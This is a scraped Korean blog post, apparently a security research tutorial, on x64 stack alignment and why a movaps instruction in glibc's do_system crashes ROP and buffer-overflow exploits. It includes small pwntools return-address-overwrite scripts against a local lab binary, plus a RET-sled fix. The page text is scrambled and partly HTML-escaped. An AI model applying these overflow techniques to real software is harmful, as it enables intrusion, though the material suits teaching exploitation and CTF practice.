&lt;h2 id=&#34;bof-py&#34;&gt;&lt;a href=&#34;#bof-py&#34; class=&#34;headerlink&#34; title=&#34;bof.py&#34;&gt;&lt;/a&gt;bof.py&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# bof.py&lt;/span&gt;

&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt;*

p = process(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;./vuln&amp;apos;&lt;/span&gt;)

gdb.attach(p)

win = &lt;span class=&#34;hljs-number&#34;&gt;0x401156&lt;/span&gt;

payload = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;apos;A&amp;apos;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt; + p64(win)

p.sendline(payload)
p.interactive()
$ python3 bof.py&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;main()&lt;/code&gt;&amp;#xC758; return &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &lt;code&gt;win()&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC758; entry point&amp;#xB85C; &amp;#xB36E;&amp;#xC5B4;&amp;#xC4F0;&amp;#xB294; &amp;#xACF5;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;Debug&#34;&gt;&lt;a href=&#34;#Debug&#34; class=&#34;headerlink&#34; title=&#34;Debug&#34;&gt;&lt;/a&gt;Debug&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/17.png&#34; alt&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;pwndbg&amp;gt; bp main+45
pwndbg&amp;gt; c&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;main()&lt;/code&gt;&amp;#xC758; ret&amp;#xC5D0; break point&amp;#xB97C; &amp;#xAC78;&amp;#xACE0; &lt;code&gt;win()&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &amp;#xD6C4;&amp;#xC758; stack &amp;#xC0C1;&amp;#xD669;&amp;#xC744; &amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/18.png&#34; alt&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;pwndbg&amp;gt; ni&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ret&amp;#xC73C;&amp;#xB85C; &amp;#xD568;&amp;#xC218; &lt;code&gt;win()&lt;/code&gt;&amp;#xC758; entry point&amp;#xC5D0; &amp;#xB3C4;&amp;#xB2EC;&amp;#xD574;&amp;#xC11C; &amp;#xD504;&amp;#xB864;&amp;#xB85C;&amp;#xADF8;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xACE0; &amp;#xB098;&amp;#xBA74; stack alignment&amp;#xAC00; &amp;#xAE68;&amp;#xC9C0;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/19.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xCEF4;&amp;#xD4E8;&amp;#xD130;&amp;#xB294; stack&amp;#xC774; &amp;#xD56D;&amp;#xC0C1; align &amp;#xB3FC;&amp;#xC788;&amp;#xB2E4;&amp;#xACE0; &amp;#xAC00;&amp;#xC815;&amp;#xD558;&amp;#xACE0; &amp;#xADF8; &amp;#xC0C1;&amp;#xD0DC;&amp;#xB97C; &amp;#xC720;&amp;#xC9C0;&amp;#xD558;&amp;#xB824;&amp;#xACE0; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC989;, &lt;code&gt;win()&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xAE68;&amp;#xC838;&amp;#xBC84;&amp;#xB9B0; alignment&amp;#xB97C; &amp;#xAE68;&amp;#xC9C4; &amp;#xC0C1;&amp;#xD0DC;&amp;#xB85C; &amp;#xC720;&amp;#xC9C0;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xACE0;, &lt;code&gt;win()&lt;/code&gt; &amp;#xC774;&amp;#xD6C4;&amp;#xC5D0; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC758; stack alignment&amp;#xB294; &amp;#xAE68;&amp;#xC9C4; &amp;#xC0C1;&amp;#xD0DC;&amp;#xAC00; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/20.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xACB0;&amp;#xAD6D; &lt;code&gt;do_system()&lt;/code&gt;&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB2E4; movaps&amp;#xC5D0; &amp;#xAC78;&amp;#xB824; segmentation fault&amp;#xB97C; &amp;#xB744;&amp;#xC6B0;&amp;#xACE0; exploit&amp;#xC740; &amp;#xC2E4;&amp;#xD328;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;RET-sled&#34;&gt;&lt;a href=&#34;#RET-sled&#34; class=&#34;headerlink&#34; title=&#34;RET sled&#34;&gt;&lt;/a&gt;RET sled&lt;/h1&gt;&lt;p&gt;&amp;#xC9C0;&amp;#xAE08;&amp;#xAE4C;&amp;#xC9C0; &amp;#xC124;&amp;#xBA85;&amp;#xD55C; &amp;#xB0B4;&amp;#xC6A9;&amp;#xC744; &amp;#xC774;&amp;#xD574;&amp;#xD558;&amp;#xC168;&amp;#xB2E4;&amp;#xBA74; &amp;#xC55E;&amp;#xC73C;&amp;#xB85C; &amp;#xACF5;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC9DC;&amp;#xC2E4; &amp;#xB54C; &amp;#xC544;&amp;#xBB34; &amp;#xBB38;&amp;#xC81C;&amp;#xC5C6;&amp;#xC744; &amp;#xAC70;&amp;#xB77C; &amp;#xC0DD;&amp;#xAC01;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB798;&amp;#xB3C4; &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &amp;#xAE00;&amp;#xC744; &amp;#xB9C8;&amp;#xBB34;&amp;#xB9AC; &amp;#xC9D3;&amp;#xAE34; &amp;#xC560;&amp;#xB9E4;&amp;#xD558;&amp;#xB2C8; &amp;#xD574;&amp;#xACB0; &amp;#xBC29;&amp;#xBC95;&amp;#xC744; &amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xC8E0;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#bof2.py&lt;/span&gt;

&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt;*

p = process(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;./vuln&amp;apos;&lt;/span&gt;)

win = &lt;span class=&#34;hljs-number&#34;&gt;0x401156&lt;/span&gt;
ret = &lt;span class=&#34;hljs-number&#34;&gt;0x40119a&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# ret sled&lt;/span&gt;

payload = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;apos;A&amp;apos;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt; + p64(ret) + p64(win)

p.sendline(payload)
p.interactive()&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/21.png&#34; alt&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;$ python3 bof2.py&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xB124;. &amp;#xC815;&amp;#xB9D0; &amp;#xBCC4;&amp;#xAC70; &amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. ret &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xD558;&amp;#xB098; &amp;#xB354; &amp;#xCD94;&amp;#xAC00;&amp;#xD574;&amp;#xC11C; RSP&amp;#xC758; &amp;#xC704;&amp;#xCE58;&amp;#xB97C; 8&amp;#xB9CC;&amp;#xD07C; &amp;#xC870;&amp;#xC815;&amp;#xD574;&amp;#xC8FC;&amp;#xBA74; BOF &amp;#xACF5;&amp;#xACA9;&amp;#xC744; &amp;#xD560; &amp;#xB54C; stack alignment&amp;#xB97C; &amp;#xC720;&amp;#xC9C0;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB108;&amp;#xBB34; &amp;#xB2E8;&amp;#xC21C;&amp;#xD558;&amp;#xACE0; &amp;#xB2F9;&amp;#xC5F0;&amp;#xD574;&amp;#xC11C; &amp;#xB354; &amp;#xC124;&amp;#xBA85;&amp;#xD560; &amp;#xAC8C; &amp;#xC5C6;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/22.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC9E0;!&lt;/p&gt;
&lt;h1 id=&#34;&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&#34;&gt;&lt;a href=&#34;#&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&#34;&gt;&lt;/a&gt;&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&lt;/h1&gt;&lt;p&gt;RET sled &amp;#xB9D0;&amp;#xACE0;&amp;#xB3C4; stack alignment&amp;#xB97C; &amp;#xC720;&amp;#xC9C0;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; ROP &amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xC740; &amp;#xB9CE;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC0AC;&amp;#xC2E4; &amp;#xD55C; &amp;#xAC00;&amp;#xC9C0; &amp;#xBC29;&amp;#xBC95; &amp;#xB354; &amp;#xBCF4;&amp;#xC5EC;&amp;#xB4DC;&amp;#xB9AC;&amp;#xB824;&amp;#xACE0; &amp;#xD588;&amp;#xB294;&amp;#xB370; &amp;#xADF8;&amp;#xAC74; endbr64&amp;#xB791; CET&amp;#xAE4C;&amp;#xC9C0; &amp;#xC124;&amp;#xBA85;&amp;#xD574;&amp;#xC57C; &amp;#xB3FC;&amp;#xC11C; &amp;#xAE30;&amp;#xD68C;&amp;#xAC00; &amp;#xB418;&amp;#xBA74; &amp;#xB530;&amp;#xB85C; &amp;#xAE00;&amp;#xC744; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/23.png&#34; alt&gt;&lt;/p&gt;
 - hack &amp; life">
  <meta property="og:image" content="https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/7.png">
  <meta property="og:url" content="https://hackyboiz.github.io/">

  <link rel="canonical" href="https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/">

  <title>[Research] x64 stack alignment - hackyboiz</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
  

  


<!--  -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
<link rel="stylesheet" href="/.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
<link rel="stylesheet" href="/.css">


<link rel="stylesheet" href="/css/main.css">

<!--  -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
</head>


<body>
  <header style="height: 40vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-addrcard"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/author/">
                <i class="iconfont icon-user-fill"></i>
                Author
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2020-12-06 13:00" pubdate>
      2020 12 6 
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.8k 
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      56
       
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2">
      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
    </div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">[Research] x64 stack alignment</h1>
                       
            <div class="markdown-body" id="post-body">
              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              <!-- hackyboiz_horizen_index -->
              <!--
              <ins class="adsbygoogle"
                   style="display:block"
                   data-ad-client="ca-pub-3672652207808168"
                   data-ad-slot="8887862313"
                   data-ad-format="auto"
                   data-full-width-responsive="true"></ins>
              <script>
                   (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
              -->
              <h1 id="&#xBA38;&#xB9BF;&#xB9D0;"><a href="#&#xBA38;&#xB9BF;&#xB9D0;" class="headerlink" title="&#xBA38;&#xB9BF;&#xB9D0;"></a>&#xBA38;&#xB9BF;&#xB9D0;</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/1.png" srcset="/img/loading.gif" alt></p>
<p>&#xBE44;&#xBC00; &#xD504;&#xB85C;&#xC81D;&#xD2B8;( &#xC544;&#xC9C1; &#xBE44;&#xBC00;, &#xC27F;! ) &#xB54C;&#xBB38;&#xC5D0; Ubuntu 20.04&#xC5D0;&#xC11C; &#xBA87; &#xAC00;&#xC9C0; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD558;&#xB2E4;&#xAC00; &#xCC98;&#xC74C; &#xBCF4;&#xB294; &#xC5D0;&#xB7EC;&#xC5D0; &#xB2F9;&#xD669;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. <code>do_system+364: movaps</code> &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC5D0;&#xC11C; Segmentation Fault&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB354;&#xB77C;&#xACE0;&#xC694;.</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/2.png" srcset="/img/loading.gif" alt></p>
<p>&#xC54C;&#xC544;&#xBCF4;&#xB2C8;&#xAE4C; Ubuntu 18.04&#xBD80;&#xD130; <code>do_system()</code>&#xC5D0; <code>movaps</code>&#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC774; &#xD558;&#xB098; &#xCD94;&#xAC00;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC870;&#xAE08; &#xB4A4;&#xC5D0; &#xC790;&#xC138;&#xD788; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC9C0;&#xB9CC;, x64 &#xB9AC;&#xB205;&#xC2A4;&#xC5D0;&#xC120; 16&#xBC14;&#xC774;&#xD2B8;&#xB85C; stack alignment&#xB97C; &#xC9C0;&#xCF1C;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. stack alignment&#xAC00; &#xAE68;&#xC838;&#xC788;&#xC73C;&#xBA74; &#xC774; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB2E4; Segmentation Fault&#xAC00; &#xB739;&#xB2C8;&#xB2E4;.</p>
<p>&#xC774;&#xB188; &#xB54C;&#xBB38;&#xC5D0; 18.04 &#xC774;&#xC804; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC775;&#xC2A4; &#xB418;&#xB294; BOF &#xACF5;&#xACA9;&#xCF54;&#xB4DC;&#xAC00; 18.04 &#xC774;&#xD6C4; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xACBD;&#xC6B0;&#xB3C4; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/3.png" srcset="/img/loading.gif" alt></p>
<p><em>&#x6545; Fabu1ous&#xC758; &#xB124;&#xC774;&#xBC84; &#xBE14;&#xB85C;&#xADF8; (2018.10 ~ 2019.12)</em></p>
<p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xD47C; &#xD3EC;&#xB108;&#xBE14; &#xBB38;&#xC81C;&#xB9CC; &#xBC31;&#xBA87; &#xAC1C;&#xCBE4; &#xB418;&#xACE0; &#xC218;&#xC5C6;&#xC774; &#xB9CE;&#xC740; <code>system(&quot;/bin/sh&quot;)</code>&#xC744; &#xD638;&#xCD9C;&#xD574; &#xBD24;&#xB294;&#xB370; &#xC5B4;&#xC9F8;&#xC11C; &#xC774; &#xC0AC;&#xC2E4;&#xC744; &#xC774;&#xC81C;&#xC57C; &#xC54C;&#xAC8C; &#xB41C; &#xAC70;&#xC9C0;?</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/4.png" srcset="/img/loading.gif" alt></p>
<p>&#xC791;&#xB144;(2019) &#xD06C;&#xB9AC;&#xC2A4;&#xB9C8;&#xC2A4; CTF&#xC5D0;&#xC11C; &#xB2E8;&#xC21C; ROP&#xBB38;&#xC81C;&#xB97C; &#xC775;&#xC2A4; &#xBABB;&#xD574;&#xC11C; &#xD654;&#xB0AC;&#xB358; &#xAE30;&#xC5B5;&#xC774; &#xBA38;&#xB9AC;&#xB97C; &#xC2A4;&#xCE58;&#xACE0; &#xC9C0;&#xB098;&#xAC14;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBD84;&#xBA85; &#xB85C;&#xCEEC;&#xC5D0;&#xC120; &#xC775;&#xC2A4;&#xAC00; &#xB418;&#xB358; &#xAC8C; &#xB9AC;&#xBAA8;&#xD2B8; &#xC775;&#xC2A4;&#xAC00; &#xC548;&#xB3FC;&#xC11C; &#xD300;&#xC6D0;&#xC5D0;&#xAC8C; &#xCF54;&#xB4DC;&#xB97C; &#xB118;&#xACA8;&#xC8FC;&#xACE0; &#xB2E4;&#xB978; &#xBB38;&#xC81C; &#xBCF4;&#xB7EC; &#xAC14;&#xC5C8;&#xC8E0;. &#xADF8;&#xB54C; &#xBABB; &#xD480;&#xC5C8;&#xB358; ROP&#xBB38;&#xC81C;&#xB294; solo_test&#xB780; &#xBB38;&#xC81C;&#xC600;&#xB294;&#xB370; &#xADF8;&#xB54C; &#xB85C;&#xCEEC; &#xD658;&#xACBD;&#xC774; &#xC6B0;&#xBD84;&#xD22C; 16.04&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xD6C4;&#x2026;</p>
<p>&#xB300;&#xD68C; &#xB05D;&#xB098;&#xACE0; &#xBC14;&#xB85C; &#xBA70;&#xCE60; &#xB4A4;&#xC5D0; &#xC774; &#xC8FC;&#xC81C;&#xC5D0; &#xB300;&#xD55C; &#xB77C;&#xC5C5;&#xC774; &#xD558;&#xB098; &#xC62C;&#xB77C;&#xC654;&#xB294;&#xB370; 1&#xB144;&#xC774; &#xC9C0;&#xB09C; &#xC9C0;&#xAE08;&#xC5D0;&#xC11C;&#xC57C; &#xCC3E;&#xC544;&#xBCF8; &#xC81C; &#xC790;&#xC2E0;&#xC774; &#xB108;&#xBB34; &#xBC09;&#xB124;&#xC694;. ROP&#xBB38;&#xC81C;&#xB77C;&#xACE0; &#xB300;&#xC218;&#xB86D;&#xC9C0; &#xC54A;&#xAC8C; &#xADF8;&#xB0E5; &#xB118;&#xACA8;&#xBC84;&#xB9B0; &#xAC83;&#xC5D0; &#xBC18;&#xC131;&#xD558;&#xBA70; &#xC9C0;&#xAE08;&#xC774;&#xB77C;&#xB3C4; &#xACF5;&#xBD80;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p>
<blockquote>
<p>&#xB2A6;&#xC5C8;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD560; &#xB54C;&#xAC00; &#xC9C4;&#xC9DC; &#xB108;&#xBB34; &#xB2A6;&#xC5C8;&#xB2E4; -&#xBC15;&#xBA85;&#xC218;-</p>
</blockquote>
<h1 id="x64-Stack-Alignment"><a href="#x64-Stack-Alignment" class="headerlink" title="x64 Stack Alignment"></a>x64 Stack Alignment</h1><p>stack alignment&#xB294; stack&#xC758; top&#xC774; 16&#xC758; &#xBC30;&#xC218;&#xB85C; &#xC720;&#xC9C0;&#xB41C; &#xC0C1;&#xD0DC;&#xBA70; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; access cycle&#xC744; &#xCD5C;&#xC18C;&#xD55C;&#xC73C;&#xB85C; &#xC904;&#xC774;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. ( CS&#xB97C; &#xACF5;&#xBD80;&#xD558;&#xB2E4;&#xAC00; &#x201C;&#xC65C;?&#x201D;&#xB77C;&#xB294; &#xC9C8;&#xBB38;&#xC744; &#xB358;&#xC9C0;&#xBA74; &#xC2ED;&#xC911;&#xD314;&#xAD6C; &#x201C;&#xD6A8;&#xC728;&#x201D;&#xC774;&#xB77C;&#xB294; &#xB300;&#xB2F5;&#xC774; &#xB3CC;&#xC544;&#xC634;, &#xB354; &#xC790;&#xC138;&#xD55C; &#xAC74; &#xC9C1;&#xC811; &#xCC3E;&#xC544;&#xBCF4;&#xC2DC;&#xAE38; ) &#xADF8;&#xB9AC;&#xACE0; &#xC774; stack alignment&#xB97C; &#xC720;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; RSP&#xC758; &#xC704;&#xCE58;&#xAC00; &#xC815;&#xD574;&#xC9C0;&#xB294; &#xADDC;&#xCE59;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/5.png" srcset="/img/loading.gif" alt></p>
<p>Linux 64 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf">ABI</a>( Application binary interface )&#xC5D0; &#xB530;&#xB974;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD750;&#xB984;( control )&#xC774; &#xD568;&#xC218;&#xC758; entry&#xB85C; &#xC62E;&#xACA8;&#xC9C0;&#xB294; &#xC2DC;&#xC810;&#xC5D0;&#xC120; &#xC2A4;&#xD0DD; &#xD3EC;&#xC778;&#xD130;(rsp)+8&#xC774; &#xD56D;&#xC0C1; 16&#xC758; &#xBC30;&#xC218;&#xC5EC;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/6.png" srcset="/img/loading.gif" alt></p>
<p>&#xBC29;&#xAE08; &#xC804;&#xC5D4; RSP&#xB97C; 16&#xC758; &#xBC30;&#xC218;&#xB85C; &#xC720;&#xC9C0;&#xD558;&#xB294; &#xAC8C; stack alignment&#xB77C; &#xD574;&#xB193;&#xACE0; &#xAC11;&#xC790;&#xAE30; RSP+8&#xC774; 16&#xC758; &#xBC30;&#xC218;&#xB77C;&#xB2C8;, &#xBB50;&#xB77C;&#xB294; &#xAC70;&#xC57C;?</p>
<p>&#xBB34;&#xC2A8; &#xC18C;&#xB9B0;&#xC9C0; &#xBAA8;&#xB974;&#xACA0;&#xC8E0;? &#xC124;&#xBA85;&#xC774; &#xBB50; &#xAC19;&#xC774; &#xC4F0;&#xC5EC;&#xC788;&#xC5B4;&#xC11C; &#xADF8;&#xB807;&#xC9C0; &#xC0AC;&#xC2E4; &#xC544;&#xC8FC; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c"><span class="hljs-comment">// test.c</span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>{
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello stack alignment\\n&quot;</span>);
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>{
	hello();
	
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre>
<pre><code class="hljs bash">$ gcc -o <span class="hljs-built_in">test</span> test.c -no-pie
$ gdb -q <span class="hljs-built_in">test</span></code></pre>
<p>&#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC81C;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xB514;&#xBC84;&#xAE45;&#xD560; &#xB54C; &#xAC70;&#xC2AC;&#xB9AC;&#xB2C8; PIE&#xB294; &#xD574;&#xC81C;&#xD558;&#xACE0; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xC138;&#xC694;. &#xC800;&#xB294; Ubuntu 20.04&#xC640; glibc-2.31&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/7.png" srcset="/img/loading.gif" alt></p>
<pre><code class="hljs bash">pwndbg&gt; bp main</code></pre>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/8.png" srcset="/img/loading.gif" alt></p>
<pre><code class="hljs bash">pwndbg&gt; r</code></pre>
